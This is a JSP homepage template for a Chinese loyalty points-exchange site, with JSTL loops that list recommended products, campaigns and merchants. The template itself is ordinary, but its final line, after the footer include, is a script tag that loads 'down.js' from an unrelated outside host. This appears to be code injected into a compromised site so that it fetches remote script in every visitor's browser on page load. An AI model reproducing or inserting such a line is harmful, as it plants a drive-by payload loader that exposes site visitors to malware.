<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<%@ taglib prefix="ct" uri="/WEB-INF/category.tld" %>

<link rel="stylesheet" href="css/style.css" type="text/css" />
<c:set var="title" value="积分联盟-首页"/>
<%@ include file="IncludeTop.jsp" %>
	
<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
	 
  <tr> 
    <td width="178" height="129" valign="top" bgcolor="#FFFFFF"> 
      <%@ include file="searchProductBar.jsp" %>
      <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>
    </td>
    <td bgcolor="#FFFFFF" valign="top" width="602"> 
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr> 
          <td colspan="4" height="13"></td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181"><a href='<c:url value="/queryProduct.do"/>'><img src="images/index_55.gif" alt="" border="0"></a></td>
          <td align="right" valign="top" background="images/index_56.gif"><a href='<c:url value="/queryProduct.do"/>' class="red">更多积分兑换。。。</a></td>
          <td rowspan="2" width="25">&nbsp;</td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181">&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
      </table>
	  <c:set var="trBegin" value='<tr>' /> <c:set var="trEnd" value='</tr>' /> 
      <c:set var="colomnSize" value="3" /> 
      <table width="100%" border="0" cellspacing="15" cellpadding="0">
        <c:forEach var="product" items="${appData.recommendedProducts}" varStatus="status"> 
        <c:if test="${status.count mod colomnSize eq 1}">
			<c:out value="${trBegin}" escapeXml="false" /> 
        </c:if> 
		<td width="33%" height="128"><table width="180" height="128" border="0" cellpadding="0" cellspacing="0">
            <tr> 
              <td width="9" height="8"><img src="images/index_0136.gif" width="9" height="8" alt=""></td>
              <td width="162" height="8"><img src="images/index_0137.gif" width="162" height="8" alt=""></td>
              <td width="9" height="8"><img src="images/index_0138.gif" width="9" height="8" alt=""></td>
            </tr>
            <tr> 
              <td width="9" height="85"><img src="images/index_0139.gif" width="9" height="85" alt=""></td>
              <td width="162" height="85"> 
                <table cellspacing="0" cellpadding="0" width="162" height="85">
                  <tr> 
                      <td width="70" rowspan="4" align="center"><a href='<c:url value="/getProductInfo.do"/>?productNo=<c:out value="${product.productNo}"/>'><img src='images/product/<c:out value="${product.productNo}"/>.jpg' width="65" height="65" border="0"></a></td>
                      <td width="90" height="23" class="blue14"><ct:slice length="12"  value="${product.name}" /></td>
                  </tr>
                  <tr>
                       
                      <td class="STYLE1" height="21"><span class="STYLE1"><a href='<c:url value="/queryProduct.do"/>?productCtg=<c:out value="${product.categoryNo}" />'><ct:code  type="product" code="${product.categoryNo}" /></a></span></td>
                  </tr>
                  <tr> 
                      <td class="STYLE1" height="21"><ct:slice length="12" value="${product.intro}" /> 
                      </td>
                  </tr>
                  <tr> 
                      <td height="20"><span class="red15"> <c:out value="${product.point}"/>分</span></td>
                  </tr>
                </table>
              </td>
              <td width="9" height="85"><img src="images/index_0141.gif" width="9" height="85" alt=""></td>
            </tr>
            <tr> 
              <td width="9" height="7"><img src="images/index_0142.gif" width="9" height="7" alt=""></td>
              <td width="162" height="7"><img src="images/index_0143.gif" width="162" height="7" alt=""></td>
              <td width="9" height="7"><img src="images/index_0144.gif" width="9" height="7" alt=""></td>
            </tr>
            <tr> 
              <td width="9" height="26">&nbsp;</td>
                <td width="162" height="26"> 
                  <div align="center"> <a href='<c:url value="/addExchange.do"/>?productNo=<c:out value="${product.productNo}"/>'>兑换</a> 
                    <a href='<c:url value="/getProductInfo.do"/>?productNo=<c:out value="${product.productNo}"/>'>详细信息</a><br/>
                    <br/>
                  </div>
              </td>
              <td width="9" height="26">&nbsp;</td>
            </tr>
          </table>
		  
		  </td>
        <c:if test="${status.count mod colomnSize eq 0}">
			<c:out value="${trEnd}" escapeXml="false" />
        </c:if>
		<c:if test="${status.count mod colomnSize ne 0  and status.last}"> 
			<c:forEach var="x" begin="${status.count mod colomnSize}" end="${colomnSize-1}" step="1"> 
				<td>&nbsp; </td>
			</c:forEach>
         </c:if> 
        </c:forEach>
      </table>
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr> 
          <td colspan="4" height="13"></td>
        </tr>
        <tr> 
          <td width="6" height="20">&nbsp;</td>
          <td height="20"><a href='<c:url value="/queryCampaign.do"/>'><img src="images/titilesheet2.gif" alt="" border="0"></a></td>
          <td background="images/index_56.gif" align="right" height="20"><a href='<c:url value="/queryCampaign.do"/>' class="red">更多积分活动。。。</a></td>
          <td rowspan="2" width="25">&nbsp;</td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181">&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
      </table>
	  <c:set var="colomnSize" value="3" /> 
      <table width="100%" border="0" cellspacing="10">
        <c:forEach var="campaign" items="${appData.recommendedCampaigns}" varStatus="status"> 
        <c:if test="${status.count mod colomnSize eq 1}">
			<c:out value="${trBegin}" escapeXml="false" /> 
        </c:if> 
          <td width="33%"> 
            <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="1" bordercolor="0" bgcolor="#CCCCCC">
              <tr> 
                <td> 
                  <table cellspacing="0" cellpadding="0" width="100%" height="100%" border="0" bgcolor="#FFFFFF">
                    <tr> 
                      <td align="center" rowspan="3" width="70"><a href='<c:url value="/getCampaignInfo.do"/>?campaignNo=<c:out value="${campaign.campaignNo}"/>'><img src='images/campaign/<c:out value="${campaign.campaignNo}"/>.jpg' width="65" height="65" border="0" ></a></td>
					  <td width="109" height="23" class="blue14"><ct:slice length="12" value="${campaign.title}"/></td>
                    </tr>
                    <tr>  					  
                      <td height="53" class="black12"><br>
                        <ct:slice length="36" value="${campaign.intro}"/></td>
                     </tr>
                    <tr>
					  <td height="21" >商户: <a href='<c:url value="/getMerchantInfo.do"/>?merchantNo=<c:out value="${campaign.merchantNo}"/>' class="orange"> 
                        <ct:slice length="10" value="${campaign.merchantName}"/></a> 
                      </td>
                    </tr>
                  </table>
				 </td>
              </tr>
            </table>          </td>          
        <c:if test="${status.count mod colomnSize eq 0}">
			<c:out value="${trEnd}" escapeXml="false" />
        </c:if>
		<c:if test="${status.count mod colomnSize ne 0  and status.last}"> 
			<c:forEach var="x" begin="${status.count mod colomnSize}" end="${colomnSize-1}" step="1"> 
				<td >&nbsp; </td>
			</c:forEach>
         </c:if> 
        </c:forEach>
      </table>
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr> 
          <td colspan="4" height="13"></td>
        </tr>
        <tr> 
          <td width="6">&nbsp;</td>
          <td width="181" rowspan="2"><a href='<c:url value="/queryMerchant.do"/>'><img src="images/titlesheet3.gif" alt="" border="0" /></a></td>
          <td rowspan="2" align="right" valign="top" background="images/index_56.gif"><a href='<c:url value="/queryMerchant.do"/>' class="red">更多加盟商户。。。</a></td>
          <td rowspan="2" width="25">&nbsp;</td>
        </tr>
        <tr> 
          <td width="6" height="15">&nbsp;</td>
        </tr>
    </table>
    <table width="100%" border="0" cellspacing="10">
		  <c:set var="colomnSize" value="3" />
        <c:forEach var="merchant" items="${appData.recommendedMerchants}" varStatus="status"> 
        <c:if test="${status.count mod colomnSize eq 1}">
			<c:out value="${trBegin}" escapeXml="false" /> 
        </c:if> 
          <td width="33%"> 
            <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="1" bordercolor="0" bgcolor="#CCCCCC">
              <tr> 
                <td height="90"> 
                  <table cellspacing="0" cellpadding="0" width="100%" height="33%" border="0" bgcolor="#FFFFFF">
                    <tr> 
                      <td align="center" rowspan="3" width="70"><a href='<c:url value="/getMerchantInfo.do"/>?merchantNo=<c:out value="${merchant.merchantNo}"/>'><img src='images/merchant/<c:out value="${merchant.merchantNo}"/>.jpg' width="65" height="65" border="0" ></a></td>
                      <td height="23" class="blue14"><ct:slice length="12" value="${merchant.merchantName}"/></td>
                    </tr>
                    <tr> 
                      <td height="21" class="STYLE1"><a href='<c:url value="/queryMerchant.do"/>?merchantCtg=<c:out value="${merchant.categoryNo}" />'><ct:code  type="merchant" code="${merchant.categoryNo}" /></a></td>
                    </tr>
                    <tr>
                      <td height="49" class="STYLE1"><ct:slice length="36"  value="${merchant.intro}" /></td>
                    </tr>
                  </table>
				  </td>
              </tr>
            </table>
		</td>          
        <c:if test="${status.count mod colomnSize eq 0}">
			<c:out value="${trEnd}" escapeXml="false" />
        </c:if>
		<c:if test="${status.count mod colomnSize ne 0  and status.last}"> 
			<c:forEach var="x" begin="${status.count mod colomnSize}" end="${colomnSize-1}" step="1"> 				
          		<td>&nbsp; </td>
			</c:forEach>
         </c:if> 
        </c:forEach>
      </table>    </td>
  </tr>
</table>


<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>